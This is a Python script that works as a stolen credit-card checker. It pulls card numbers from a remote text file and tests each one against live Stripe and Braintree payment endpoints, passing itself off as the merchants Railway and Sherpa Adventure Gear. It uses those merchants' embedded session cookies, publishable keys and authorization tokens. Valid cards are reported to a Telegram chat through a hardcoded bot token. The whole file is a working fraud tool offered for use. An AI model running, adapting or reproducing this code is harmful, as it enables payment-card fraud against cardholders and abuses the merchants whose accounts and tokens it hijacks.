import requests
import requests,hashlib
import re
import random
import telebot
import time
bot1 = telebot.TeleBot("7159559652:AAHg0s756TiP3PXWwUuCH4F1YUz5S74GlJU")
id1 = '7037898496'
egyptian_names = ["Amir", "Youssef", "Laila", "Mariam", "Omar", "Sara", "Ahmed", "Fatma", "Ali", "Nour",
                  "Mohamed", "Aya", "Khaled", "Hana", "Ibrahim", "Hadeer", "Hassan", "Reem", "Tarek", "Dina"]


def stripe():
	s=requests.session()
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&billing_details[address][postal_code]=10080&guid=7c6d3993-ce54-43ff-838d-bfb75d5a23b5c4e6d0&muid=197c981a-cdc6-4aeb-8a27-b5cba3c3915172cdb0&sid=d42a7a1c-b199-45d5-980e-f0c6cebcfe820da327&pasted_fields=number&payment_user_agent=stripe.js%2Fd2c4996313%3B+stripe-js-v3%2Fd2c4996313%3B+card-element&referrer=https%3A%2F%2Frailway.app&time_on_page=28437&key=pk_live_51HNrvlCJoPsRzQsdhv2DcOFeyBnr2dUEqlitVOpmr5S7BAzg5w4Aj7NtZfonqilddhEdVtK1xALvkaN3J0a9o5p900N0ORMqp6&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYsuwqDQ1pPH5HCakOip0h9TIbHgtW_un_LcqfZdMQs4CxPnWHNjRzV37dtl90f_QlRQOe_hd77o9NI0UQwrfJMXsycDMMdeuRlCh5Nmh-eZMA9r8dQyJJWX6LIm1uD7AaOl82A2BvrOlJ5vz6SluAX-3V05IXe57Z25gg5L4Zp118pQKmazM3KMuz6JjTinAWP7DvS5vfx45ezUvotJYhWxBBReIwewVqqLySlirCKShIBkPBqoD2Hz1iQ970jl4K856ynE84JoHK280-03i1hj2KBAJtf3NAh7VTPvezfFsdj2_Ef1aEPnXaKNOCcb--wwjRDzuppYb4_ZWLlmlU8W70oM8Fe1velVNxrjbC9dvAPfA6aOcd0bDkUSxX7pgv1JtDOSDYvX2IjeiaOWT5fr-kgPEhud9EqWxkolhMwgkVQ3Lk9UW0xCwkSgyOGs05e9qLL0vRjaGYxjU7ilY-b0J2k_GRslmMKNETCe20HYYcJJ-9fXId7PP_YtWDRY04vgWTKWqlnUhjsC7fPoc3Bsk3SZZc7GVleQz3BeavtCs8qxwYkU2v3prTECe4wOetswtQImPHFA9FVQqk7ntQdk1k7cOtAMPJw6XRCoP7E_25aLynh3AfN_ADL6ztJdgR4FjtAYtVUWTVw7wuxo7CMAtkN_41GGaPuVsGlHwk05p-iKfoMBUavhvIubWC0D6HdxvZun9FTboZhGetIWNWE--LjTb7LXdaLHPjpORaNVjdj0dAzSzk3Sjp0gHxqJBXM703PWSQAdoeT7ujUXM7Xi20W9rKmnyL9E0brVJBJdbMKB7PRy19mvucX5lF6p19NSF-l0WNDRm__DiuajXYJkfL75OQu9TsppG8KjEPIUvAiwkF0bQqR8Uj8IsqQazOF3lk1IZkS9hQ0obkcYDRrzLq_Adh9ITNdqC9pj6OYG5EAEAuwjiKMCQS2dcaJEwyG1Dyp67HfeCvQ1SNABeGNvyyHeeBJ7nf3vNmTZXvr8fMWq_4eBnWpu2StWixlT-60Q2oAGc-S1elyGwId2ttzQY1s0wrKD6QQQQoXNrA0lA4TPqmR9u54xayOCb1CAoVleL8IxEv3qQHhAzFJjGyu5iH3BzyZvRHNj4LHhUwu34z72cfj2E0yjO7lLymDvwz16TCQ7Az7NOur29Yy4dPfgljfLhzuaS4jES5aSAO9R0ATuSPXT67kQmN5pLeUIgPB9LZa2KX7hXPqsnSQs6qHnpnbL5IW5vB_GnwdSru5pk5AOh2x33XGjHr-e2_u8w_HA6NfEXe3LEbnnOrxS7KSgmBI9fAjkBdy-OZET03nBYKA-gRAVevp58pm_lD3FRuFh6lb0aLFm3LtqQcD90kPCWaf3hwXbmxsApRu7_JBmVnqsjZVBQNIVzu0RlxJCTecIR-cB48FQcxT60y21lpTWMfxTX7Aqy0sfqSW3oRqOzZyXg9d7vOpAb4iuhw8NDWNqrWe_GR1qB7Y8fvzWxc1yGfWYyeL1QFdmZHKfbi-GI0h7IDT7lVQmDfALqzHwlBMDanqDYd9vFv4mvi7ntfsyEs6BY54hkN8aChImfSqSnvEdXdN8K01gKBmdWJKZ1m9OvCvTLKR72uX5J4HoeiWCsxxN0S4iRmLW3iwE1awZi1VReqgi3OlQehMT0OD8FVNXEM5sIlAVXjTxk3R_yTU7Fp0_JffB2kamT4nEHs2pJiFw5aFuZuDFyMeMVLZjdXtWTlG0ceGCqgloj7RKY9mzrz4RXmJfUPeU7G8hqAwrd2VdQGoTcysJd-uA5v-3hEA7N_1aJwb93dcSYB98fZU-ug49PLr0uPhwazcRJh1BQT7x3t5_5tjb0NtWYcuiHRiR0YQMRS0AQ6FFZioz26C3-NjGLB-89AsI5iLiQSStlgR99wRmmjuQyIsjEvE7XD6Iw8Jyeb2FVCJnWea28pZpOkNvYRJrUEaFjsJkkJ-EdjamWiknmRz1BpDA60UDBEtYACRuucSOnMZYzfaYlkJzX1Gatg5KkVusM5wOGDxu_ybcmrT2J3cEmUZdsZ2uOiNt9TgdOvIzFXND2K05qpCOFiczH3REwhRrZWNLV9dZXA6y8YkoQt7_br61kCjZXhwzmYwxkaoc2hhcmRfaWTOAzGDb6JrcqgzZjlkM2U2N6JwZAA.T9KGVDYdaHr088urAb9SK0P5uCWIVXcbWOMymqMtbNQ'
	
	res = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	if "card_error" in res.text:
		pass
	else:
		#print(res.text)
		response=res.json()['id']
		#print(response)
		#print("*"*50)
		
		
		#####171706369382866
		cookies1 = {
		    '__stripe_mid': '197c981a-cdc6-4aeb-8a27-b5cba3c3915172cdb0',
		    '__stripe_sid': 'd42a7a1c-b199-45d5-980e-f0c6cebcfe820da327',
		    'rw.session': 'rw_Fe26.2**716920a74752091eff0d8ac90baa60b2834eab0b7ade80663b648ba651836418*DsrAF57I38X9zuaqHGnPyg*WZ2NWyKmySht2hjhAJIG-lw8nAXpJUU1pS5AACPxdTPgjhttpFXtmEWFGlTeFX7s9ysqPRss1rzEqVL2USCiAg*1717063693828*b28a700857d001011e434d79ec720fffa855a257c09b4110ef2d7fdbfa255b59*0T01VoJNrMsqGUss2NSurCFzQ7qZ5m59asQojhelw6U',
		    'rw.session.sig': 'BJvxzhCR7CYLXgma2OpdYElERmI',
		}
		
		headers1 = {
		    'authority': 'backboard.railway.app',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    # 'cookie': '__stripe_mid=197c981a-cdc6-4aeb-8a27-b5cba3c3915172cdb0; __stripe_sid=d42a7a1c-b199-45d5-980e-f0c6cebcfe820da327; rw.session=rw_Fe26.2**716920a74752091eff0d8ac90baa60b2834eab0b7ade80663b648ba651836418*DsrAF57I38X9zuaqHGnPyg*WZ2NWyKmySht2hjhAJIG-lw8nAXpJUU1pS5AACPxdTPgjhttpFXtmEWFGlTeFX7s9ysqPRss1rzEqVL2USCiAg*1717063693828*b28a700857d001011e434d79ec720fffa855a257c09b4110ef2d7fdbfa255b59*0T01VoJNrMsqGUss2NSurCFzQ7qZ5m59asQojhelw6U; rw.session.sig=BJvxzhCR7CYLXgma2OpdYElERmI',
		    'origin': 'https://railway.app',
		    'referer': 'https://railway.app/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		}
		
		params1 = {
		    'q': 'customerAttachPaymentMethod',
		}
		
		json_data1 = {
		    'query': 'mutation customerAttachPaymentMethod($id: String!, $input: CustomerAttachPaymentMethodInput!) {\n  customerAttachPaymentMethod(id: $id, input: $input)\n}',
		    'variables': {
		        'id': 'f8a4f8e8-269a-4f2a-ab4a-03e298e1f89a',
		        'input': {
		            'paymentMethodId':response,
		            'validateWithHold': True,
		        },
		    },
		    'operationName': 'customerAttachPaymentMethod',
		}
		
		response1 = s.post(
		    'https://backboard.railway.app/graphql/internal',
		    params=params1,
		    cookies=cookies1,
		    headers=headers1,
		    json=json_data1,
		).text
		#print(response1)
		if "declined" in response1:
				print("Your payment was declined"+f"{c}")
		elif "security code is incorrect" in response1:
			print("security code is incorrect"+f"{c}")
		elif "incorrect" in response1:
			print("card number incorrect"+f"{c}")
		elif "insufficient" in  response1:
					bot1.send_message(id1, c+"\ninsufficient\nStripe")
					bot1.send_message(id1, response1,parse_mode='none')
		elif "use_stripe_sdk" in response1:
			print("susibtable"+f"{c}")
			#bot1.send_message(id1,c+"\n susbtiable")
		else:
					bot1.send_message(id1,c+"unkown")
					#bot1.send_message(id1, response1,parse_mode='none')	
def Braintree():
	s=requests.session()
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTQ2Njk5MDksImp0aSI6IjJkZDE3YzNiLTI0YzctNDY3NC1iYWM5LTE1NzEyZjNjNGIzMiIsInN1YiI6Ijh0M2h5aHI0cXhmcmt0ZjgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh0M2h5aHI0cXhmcmt0ZjgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoic2hlcnBhYWR2ZW50dXJlZ2VhcnVzX2luc3RhbnQifX0.GO_eEeACrh8Guo4mNfziFG5DGMAednP81v_WmJGNxfmjXtdn6bzo3oEekPfmZiOFp-sNU4_-oBYVlFpcaouCUw',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '9c91e7f6-1bd7-4d32-a9c0-81443ec261a0',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
		            'creditCard': {
		                'number': card,
		                'expirationMonth': mon,
		                'expirationYear': year,
		                'cvv': cvv,
		            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response =s.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	#print(response.text)
	#print("*"*50)
	token =(response.json()['data']['tokenizeCreditCard']['token'])
	
	
	
	#####171706369382866
	#import requests
	
	headers1 = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.sherpaadventuregear.com',
	    'referer': 'https://www.sherpaadventuregear.com/checkout',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data1 = {
	    'amount': '80',
	    'additionalInfo': {
	        'acsWindowSize': '03',
	    },
	    'bin': bin,
	    'dfReferenceId': '1_2b5c3c91-f074-4042-ae49-8e8c6b051b0c',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.62.1',
	        'cardinalDeviceDataCollectionTimeElapsed': 99,
	        'issuerDeviceDataCollectionTimeElapsed': 343,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTQ2Njk5MDksImp0aSI6IjJkZDE3YzNiLTI0YzctNDY3NC1iYWM5LTE1NzEyZjNjNGIzMiIsInN1YiI6Ijh0M2h5aHI0cXhmcmt0ZjgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh0M2h5aHI0cXhmcmt0ZjgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoic2hlcnBhYWR2ZW50dXJlZ2VhcnVzX2luc3RhbnQifX0.GO_eEeACrh8Guo4mNfziFG5DGMAednP81v_WmJGNxfmjXtdn6bzo3oEekPfmZiOFp-sNU4_-oBYVlFpcaouCUw',
	    'braintreeLibraryVersion': 'braintree/web/3.62.1',
	    '_meta': {
	        'merchantAppId': 'www.sherpaadventuregear.com',
	        'platform': 'web',
	        'sdkVersion': '3.62.1',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '9c91e7f6-1bd7-4d32-a9c0-81443ec261a0',
	    },
	}
	response1 = s.post(
		    f'https://api.braintreegateway.com/merchants/8t3hyhr4qxfrktf8/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
		    headers=headers1,
		    json=json_data1,
		)
	#print(response1.text)
	if 'authenticate_successful' in response1.text:
		print(f' -> authenticate_successful ✅')
		bot1.send_message(id1, c+"\nAuthenticate Successful ✅\nBraintree Auth ")
	elif 'authenticate_attempt_successful' in response1.text:
		print(f' -> Authenticate Attempt Successful ✅')
		bot1.send_message(id1, c+"\nAuthenticate Attempt Successful ✅\nBraintree Auth ")
	elif 'authenticate_frictionless_failed' in response1.text:
		print(f' -> Authenticate Rejected ❌')
	else:print("Error404")
url = "https://raw.githubusercontent.com/MohamedShehata86700/Doc/main/card.txt"
response = requests.get(url)
lines = response.text.splitlines()
filtered_lines = [line.strip() for line in lines if '|' in line]
for i in range(len(filtered_lines) - 1):
	c = filtered_lines[i]
	print(c)
	z=c.split("|")
	card=z[0]
	mon=z[1]
	print()
	if len(z[2]) == 2:
		year=z[2]
	else:
		year=z[2][2:]
	print(card)
	cvv=z[3]
	bin=card[:6]
	stripe()
	print("2"*50)
	Braintree()


print("finsh............")		
